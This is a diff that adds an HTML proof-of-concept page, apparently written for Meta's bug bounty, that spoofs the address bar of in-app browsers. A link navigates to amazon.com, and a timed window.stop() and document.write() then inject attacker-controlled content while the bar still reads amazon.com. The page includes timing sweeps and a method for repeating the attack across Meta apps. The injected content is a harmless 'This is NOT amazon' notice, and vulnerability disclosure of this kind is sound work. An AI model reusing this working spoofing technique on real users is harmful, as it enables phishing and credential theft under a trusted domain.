@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>IAB Spoof Lab (amazon) — Meta BBP</title>
+<style>
+  :root{--bg:#0f1420;--card:#1a2233;--ink:#e7ecf5;--mut:#93a0b8;--ok:#3ddc97;--warn:#ffcc66;--bad:#ff6b6b;--accent:#ff9900}
+  *{box-sizing:border-box}body{margin:0;font:15px/1.55 -apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--ink);padding:16px}
+  h1{font-size:18px;margin:0 0 4px}.sub{color:var(--mut);font-size:13px;margin:0 0 14px}
+  .card{background:var(--card);border:1px solid #28344b;border-radius:12px;padding:14px;margin:10px 0}
+  .card h2{font-size:14px;margin:0 0 8px}.card p{margin:4px 0;color:var(--mut);font-size:13px}
+  a.spoof{display:inline-block;background:var(--accent);color:#111;font-weight:800;padding:12px 15px;margin:6px 6px 0 0;border-radius:10px;text-decoration:none;font-size:15px}
+  .host{font:12px ui-monospace,monospace;color:var(--ok);word-break:break-all}
+  input{width:120px;padding:10px;border-radius:8px;border:1px solid #28344b;background:#0b1220;color:var(--ink);font:14px ui-monospace,monospace;margin:4px 6px 4px 0}
+  button{appearance:none;border:0;border-radius:9px;background:var(--accent);color:#111;font-weight:700;padding:10px 14px;font-size:14px}
+  code{background:#0b1220;border:1px solid #28344b;border-radius:5px;padding:1px 5px;font-size:12px}
+</style>
+</head>
+<body>
+<h1>IAB Spoof Lab — amazon.com</h1>
+<p class="sub">Meta BBP research · benign PoC. Tap a timing; the IAB navigates to amazon.com (bar flips) then the load is stopped and this PoC is injected. Goal: bar reads <b>amazon.com</b> while content says "This is NOT amazon".</p>
+
+<div class="card">
+  <h2>Ground truth</h2>
+  <p>Real host (bar SHOULD show): <span class="host" id="host"></span></p>
+</div>
+
+<div class="card">
+  <h2>Fine sweep (250–500ms window)</h2>
+  <p>Your result: ≤250ms = bar stays github; ≥500ms = real amazon loads. The spoof is between. Tap each; find where <b>bar=amazon.com + content=PoC</b>.</p>
+  <div id="fine"></div>
+</div>
+
+<div class="card">
+  <h2>Custom timing — bisect freely</h2>
+  <p>Enter a delay (ms) and tap. Narrow until the bar shows amazon.com with this PoC content.</p>
+  <input id="ms" type="number" value="375" inputmode="numeric">
+  <a class="spoof" id="custom" href="https://www.amazon.com/">spoof @ custom</a>
+</div>
+
+<div class="card">
+  <h2>Method</h2>
+  <p>Once a timing spoofs in one app, (1) record it, (2) try the same timing in the other apps (Messenger/IG/FB/Threads), (3) screenshot bar + content. Timing may differ per app/device.</p>
+</div>
+
+<script>
+  document.getElementById('host').textContent = location.host;
+  var AMAZON='https://www.amazon.com/';
+  var FINE=[275,300,325,350,375,400,425,450,475];
+
+  var ATTACK='<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1"><title>amazon.com</title></head>'+
+    '<body style="font:16px/1.5 -apple-system,sans-serif;background:#111827;color:#fff;padding:28px;margin:0">'+
+    '<h1 style="color:#ff6b6b">⚠ This is NOT amazon.</h1>'+
+    '<p>If the address bar reads <b>amazon.com</b> while you read this, the in-app browser address bar is <b>spoofed</b>. '+
+    'This page is attacker-controlled and unrelated to Amazon.</p>'+
+    '<p style="color:#93a0b8;font-size:13px">Screenshot the bar + this text as proof, note the timing &amp; which app.</p>'+
+    '<p><a href="'+location.href.split("?")[0]+'" style="color:#ff9900">&larr; back to lab</a></p></body></html>';
+
+  function doSpoof(delay){
+    setTimeout(function(){
+      try{window.stop();}catch(e){}
+      try{document.open();document.write(ATTACK);document.close();}catch(e){}
+    }, delay);
+    // anchor href (real click = user gesture) carries the navigation to amazon → bar updates
+  }
+
+  var fine=document.getElementById('fine');
+  FINE.forEach(function(d){
+    var a=document.createElement('a'); a.className='spoof'; a.href=AMAZON; a.textContent=d+'ms';
+    a.addEventListener('click', function(){ doSpoof(d); }, false);
+    fine.appendChild(a);
+  });
+
+  var custom=document.getElementById('custom');
+  custom.addEventListener('click', function(){
+    var d=parseInt(document.getElementById('ms').value,10)||375;
+    doSpoof(d);
+  }, false);
+</script>
+</body>
+</html>
